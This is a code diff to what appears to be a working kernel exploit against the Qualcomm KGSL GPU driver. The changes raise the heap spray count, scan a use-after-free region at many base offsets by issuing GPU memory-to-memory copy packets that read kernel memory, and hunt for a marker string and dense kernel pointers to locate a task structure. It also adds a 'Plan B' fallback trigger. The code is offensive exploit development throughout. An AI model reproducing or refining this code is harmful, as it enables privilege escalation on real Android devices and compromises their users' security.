@@ -197,7 +197,7 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 3000
+#define SPRAY_COUNT 5000
 #define SPRAY_COUNT_STEP 500
 #define SPRAY_COUNT_MAX 10000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
@@ -1764,8 +1764,8 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         return 0; 
     }
 
-    // ROG strictness: ignore low-density garbage
-    if (kptrs < 30 && marker_off == -1 && strings < 2) {
+    // ROG strictness: ignore garbage with no kernel pointers unless it's our marker
+    if (marker_off == -1 && kptrs < 30) {
         return 0;
     }
 
@@ -1872,37 +1872,47 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel pointers...\n");
     fflush(stderr);
 
+    uint64_t uaf_base_offsets[] = {
+        0x780, 0x0, 0x800, 0x400, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
+        0xc00, 0xa00, 0x600, 0xe00, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
+        0x080, 0x480, 0x580, 0x680, 0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
+    int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
     int marker_found = 0;
-    int pages_scanned = 0;
-    uint64_t start_va = UAF_START & ~0xFFFULL;
-    uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
-    uint64_t current_va = start_va;
+    int total_pages_scanned = 0;
 
-    while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found)
+    for (int off_idx = 0; off_idx < num_offsets && !marker_found; off_idx++)
     {
-        uint32_t *cmd = (uint32_t *)ib_vma;
-        memset(ib_vma, 0, ib_alloc.mmapsize);
-        memset(dst_vma, 0, dst_alloc.mmapsize);
-        int dw = 0;
+        uint64_t current_va = UAF_START + uaf_base_offsets[off_idx];
+        uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
+        int pages_scanned = 0;
+        
+        fprintf(stderr, "\n      [*] Scanning with base offset 0x%lx...\n", (unsigned long)uaf_base_offsets[off_idx]);
 
-        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
-
-        // Read full 4096 bytes (1024 dwords)
-        for (int i = 0; i < 1024; i++)
+        while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
         {
-            uint32_t d_lo, d_hi, s_lo, s_hi;
-            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
-            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
+            uint32_t *cmd = (uint32_t *)ib_vma;
+            memset(ib_vma, 0, ib_alloc.mmapsize);
+            memset(dst_vma, 0, dst_alloc.mmapsize);
+            int dw = 0;
 
-            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0x00000000;
-            cmd[dw++] = d_lo;
-            cmd[dw++] = d_hi;
-            cmd[dw++] = s_lo;
-            cmd[dw++] = s_hi;
-        }
+            cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
-        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+            // Read full 4096 bytes (1024 dwords)
+            for (int i = 0; i < 1024; i++)
+            {
+                uint32_t d_lo, d_hi, s_lo, s_hi;
+                split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
+                split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
+
+                cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0x00000000;
+                cmd[dw++] = d_lo;
+                cmd[dw++] = d_hi;
+                cmd[dw++] = s_lo;
+                cmd[dw++] = s_hi;
+            }
+
+            cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
         size_t ib_bytes = (size_t)dw * 4;
         msync(ib_vma, ib_bytes, MS_SYNC);
@@ -1948,6 +1958,17 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
         if (has_data) {
             int kptrs = analyze_uaf_page(bytes, current_va);
             
+            // Plan B: if we found a high-density page (saved in gbuf) but no marker yet
+            if (marker_found == 0 && *(uint64_t*)&gbuf[GBUF_TASK_VA] != 0) {
+                // If density is very high (>150) or we've scanned enough, trigger Plan B
+                if (kptrs > 160 || total_pages_scanned > 1500) {
+                    fprintf(stderr, "\n      [!!!] TRIGGERING PLAN B: High-density task (K-PTRs: %d) at 0x%lx\n", 
+                            kptrs, (unsigned long)*(uint64_t*)&gbuf[GBUF_TASK_VA]);
+                    marker_found = 1;
+                    goto cleanup;
+                }
+            }
+
             pid_t comm_pid = -1;
             if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
             {
@@ -2046,18 +2067,20 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             }
         }
 
-        current_va += PAGE_SIZE; // Aligned scan is enough now
+        current_va += PAGE_SIZE * SCAN_PAGE_STEP;
         pages_scanned++;
-        if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
+        total_pages_scanned++;
+        if (total_pages_scanned % SCAN_PROGRESS_EVERY == 0)
         {
             fprintf(stderr, ".");
             fflush(stderr);
             usleep(500);
         }
     }
+}
 
     fprintf(stderr, "\n      [*] Scan complete: scanned %d pages, found %d candidates\n",
-            pages_scanned, *num_found);
+            total_pages_scanned, *num_found);
     fflush(stderr);
 
 cleanup:
